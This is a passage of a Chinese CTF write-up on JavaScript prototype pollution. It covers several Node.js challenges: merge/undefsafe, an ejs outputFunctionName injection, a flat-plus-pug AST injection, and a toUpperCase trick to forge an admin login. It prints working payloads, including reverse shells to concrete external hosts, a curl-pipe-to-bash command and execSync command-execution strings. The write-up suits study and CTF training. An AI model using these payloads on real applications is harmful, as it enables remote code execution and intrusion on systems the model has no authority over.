               object1[key] = object2[key]
           }
       }
     }
    var user ={}
    body=JSON.parse('{"__proto__":{"query":"return 123"}}');
    copy(user,body);
    console.log(query);
这里涉及到的是一个 变量的覆盖
最后输出的结果是覆盖后的结果
那么 为啥query会被修改呢
首先原型链污染 就是 js中 所有对象的原型都可以继承到 Object 然后 终点是null对象 在前面也有说 当在上下文中找不到相应对象的时候
会遍历Object对象 是否存在相应的属性
也就是说 在上面那个题中 不需要secret中有ctfshow属性 这个里面也不需要有query属性 当找不到的时候 会自动开始遍历 当我们进行污染之后
会在原型中找到相关的属性 而此时 这个属性已经被我们给污染了 为我们所用
在上面的demo中 就是当copy调用的时候 原型链被污染了
至于`{ query: Function(query)(query)}`​​ 为何为 `{ query: 123 }`​​
js的函数实际上都是一个 Function对象 其参数为
    new Function ([arg1[, arg2[, ...argN]],] functionBody)
#### 0xgame dont_pollute_me
访问source路由可以获得源码
在源码中涉及到merge方法 可能涉及到原型链污染
在time路由中存在命令执行
gotit路由中 涉及到merge的利用 可以修改键值对
将 **proto** 修改 修改cmd为自己想要执行的命令
    {"__proto__":{"cmd":"bash -i >& /dev/tcp/1.13.251.106/4000 0>&1"}}
在gotit路由下修改完后 访问time路由触发命令执行
可以弹shell
使用
    find / -name flag
可以找到flag
#### [网鼎杯 2020 青龙组]notes
题目给出源码
    var express = require('express');
    var path = require('path');
    const undefsafe = require('undefsafe');
    const { exec } = require('child_process');
    var app = express();
    class Notes {
        constructor() {
            this.owner = "whoknows";
            this.num = 0;
            this.note_list = {};
        }
        write_note(author, raw_note) {
            this.note_list[(this.num++).toString()] = {"author": author,"raw_note":raw_note};
        }
        get_note(id) {
            var r = {}
            undefsafe(r, id, undefsafe(this.note_list, id));
            return r;
        }
        edit_note(id, author, raw) {
            undefsafe(this.note_list, id + '.author', author);
            undefsafe(this.note_list, id + '.raw_note', raw);    //应该是在这里涉及键值的修改
        }
        get_all_notes() {
            return this.note_list;
        }
        remove_note(id) {
            delete this.note_list[id];
        }
    }
    var notes = new Notes();
    notes.write_note("nobody", "this is nobody's first note");
    app.set('views', path.join(__dirname, 'views'));
    app.set('view engine', 'pug');
    app.use(express.json());
    app.use(express.urlencoded({ extended: false }));
    app.use(express.static(path.join(__dirname, 'public')));
    app.get('/', function(req, res, next) {
      res.render('index', { title: 'Notebook' });
    });
    app.route('/add_note')
        .get(function(req, res) {
            res.render('mess', {message: 'please use POST to add a note'});
        })
        .post(function(req, res) {
            let author = req.body.author;
            let raw = req.body.raw;
            if (author && raw) {
                notes.write_note(author, raw);
                res.render('mess', {message: "add note sucess"});
            } else {
                res.render('mess', {message: "did not add note"});
            }
        })
    app.route('/edit_note')
        .get(function(req, res) {
            res.render('mess', {message: "please use POST to edit a note"});
        })
        .post(function(req, res) {
            let id = req.body.id;
            let author = req.body.author;
            let enote = req.body.raw;
            if (id && author && enote) {
                notes.edit_note(id, author, enote);
                res.render('mess', {message: "edit note sucess"});
            } else {
                res.render('mess', {message: "edit note failed"});
            }
        })
    app.route('/delete_note')
        .get(function(req, res) {
            res.render('mess', {message: "please use POST to delete a note"});
        })
        .post(function(req, res) {
            let id = req.body.id;
            if (id) {
                notes.remove_note(id);
                res.render('mess', {message: "delete done"});
            } else {
                res.render('mess', {message: "delete failed"});
            }
        })
    app.route('/notes')
        .get(function(req, res) {
            let q = req.query.q;
            let a_note;
            if (typeof(q) === "undefined") {
                a_note = notes.get_all_notes();
            } else {
                a_note = notes.get_note(q);
            }
            res.render('note', {list: a_note});
        })
    app.route('/status')
        .get(function(req, res) {
            let commands = {
                "script-1": "uptime",
                "script-2": "free -m"
            };
            for (let index in commands) {
                exec(commands[index], {shell:'/bin/bash'}, (err, stdout, stderr) => {    //此处执行command代码
                    if (err) {
                        return;
                    }
                    console.log(`stdout: ${stdout}`);
                });
            }
            res.send('OK');
            res.end();
        })
    app.use(function(req, res, next) {
      res.status(404).send('Sorry cant find that!');
    });
    app.use(function(err, req, res, next) {
      console.error(err.stack);
      res.status(500).send('Something broke!');
    });
    const port = 8080;
    app.listen(port, () => console.log(`Example app listening at http://localhost:${port}`))
在上面的源码中 涉及到 undefsafe的使用 也就是说 只要我们可以控制其第 2 3 个参数 便可以达到原型链污染的目的
在上面存在 undefsafe的调用的 只有两处 第一处 在edit_note 另一处在 get_note
在edit的路由中
其实是三个参数 都是可以控制的 那么这里存在被污染的可能 那么 我们可以通过此处 对上面定义的 note_list 进行污染 然后再去status路由下
进行命令执行
    edit_note(id, author, raw) {
            undefsafe(this.note_list, id + '.author', author);
            undefsafe(this.note_list, id + '.raw_note', raw);
        }
在此处 我们看到 edit中的参数 id参数 是在undefsafe的第二个参数位置上的 author和raw是在 第三个参数上的
我们在这里 将id赋值为我们想要污染的属性 后面为污染的值
而在command处 则是对于其中可能存在的命令进行遍历 然后执行 也就是 我们可以随意的污染属性 从而达到执行命令的目的
    payload：id=__proto__.aaa&author=curl IP|bash&raw=1
反弹shell
#### [GYCTF2020]Ez_Express
    var express = require('express');
    var router = express.Router();
    const isObject = obj => obj && obj.constructor && obj.constructor === Object;
    const merge = (a, b) => {
      for (var attr in b) {
        if (isObject(a[attr]) && isObject(b[attr])) {
          merge(a[attr], b[attr]);
        } else {
          a[attr] = b[attr];
        }
      }
      return a
    }
    const clone = (a) => {
      return merge({}, a);
    }
    function safeKeyword(keyword) {
      if(keyword.match(/(admin)/is)) {
          return keyword
      }
      return undefined
    }
    router.get('/', function (req, res) {
      if(!req.session.user){
        res.redirect('/login');
      }
      res.outputFunctionName=undefined;
      res.render('index',data={'user':req.session.user.user});
    });
    router.get('/login', function (req, res) {
      res.render('login');
    });
    router.post('/login', function (req, res) {
      if(req.body.Submit=="register"){
       if(safeKeyword(req.body.userid)){
        res.end("") 
       }
        req.session.user={
          'user':req.body.userid.toUpperCase(),
          'passwd': req.body.pwd,
          'isLogin':false
        }
        res.redirect('/'); 
      }
      else if(req.body.Submit=="login"){
        if(!req.session.user){res.end("")}
        if(req.session.user.user==req.body.userid&&req.body.pwd==req.session.user.passwd){
          req.session.user.isLogin=true;
        }
        else{
          res.end("")
        }
      }
      res.redirect('/'); ;
    });
    router.post('/action', function (req, res) {
      if(req.session.user.user!="ADMIN"){res.end("")} 
      req.session.user.data = clone(req.body);
      res.end("");  
    });
    router.get('/info', function (req, res) {
      res.render('index',data={'user':res.outputFunctionName});
    })
    module.exports = router;
www.zip 源码泄露 以上为index.js 源码
上面定义了merge方法
在此处调用了 clone 存在 原型链污染的可能 在上面clone将传入的值 与 空白对象 进行merge操作
在下面的info路由中 将`c ​`​​渲染到了 index中 而且 在上面 `outputFunctionName ​`​​还是未定义的属性 我们可以尝试
污染这个属性
基本理顺了 但是 在尝试访问 action路由的时候 我们发现 只有admin才能访问 那么 我们需要尝试 以admin来登录 我们在register路由中
看到toUpperCase方法 这里可以 想到 在ctfshow中学习到的JavaScript的特性 toUpperCase 存在
    "ı".toUpperCase() == 'I'，"ſ".toUpperCase() == 'S'
以上的漏洞 我们可以 借此伪造admin登录
    userid=admın&pwd=123&Submit=register
登录之后 就可以按照我们上面的思路 进行原型链污染
    {"lua":"123","__proto__":{"outputFunctionName":"t=1;return global.process.mainModule.constructor._load('child_process').execSync('id')\n//"},"Submit":""}
#### [湖湘杯 2021 final]vote
给出源码
    const path              = require('path');
    const express           = require('express');
    const pug               = require('pug');
    const { unflatten }     = require('flat');
    const router            = express.Router();
    router.get('/', (req, res) => {
        return res.sendFile(path.resolve('views/index.html'));
    });
    router.post('/api/submit', (req, res) => {
        const { hero } = unflatten(req.body);
        if (hero.name.includes('奇亚纳') || hero.name.includes('锐雯') || hero.name.includes('卡蜜尔') || hero.name.includes('菲奥娜')) {
            return res.json({
                'response': pug.compile('You #{user}, thank for your vote!')({ user:'Guest' })
            });
        } else {
            return res.json({
                'response': 'Please provide us with correct name.'
            });
        }
    });
    module.exports = router;
在上面 使用了flat 和 pug 渲染 flat可以原型链污染 pug可以rce
    {
        "__proto__.block": {
            "type": "Text", 
            "line": "process.mainModule.require('child_process').execSync(`bash -c 'bash -i >& /dev/tcp/p6.is/3333 0>&1'`)"
        }
    }
但是 我们需要给hero.name 赋值 然后 才能触发pug.conpile
    {"__proto__.hero":{"name":"菲奥娜"},
    {
        "__proto__.block": {
            "type": "Text", 
            "line": "process.mainModule.require('child_process').execSync('cat /flag > app/static/1.txt')"
        }
    }}
### Ending
### ‍参考文章
‍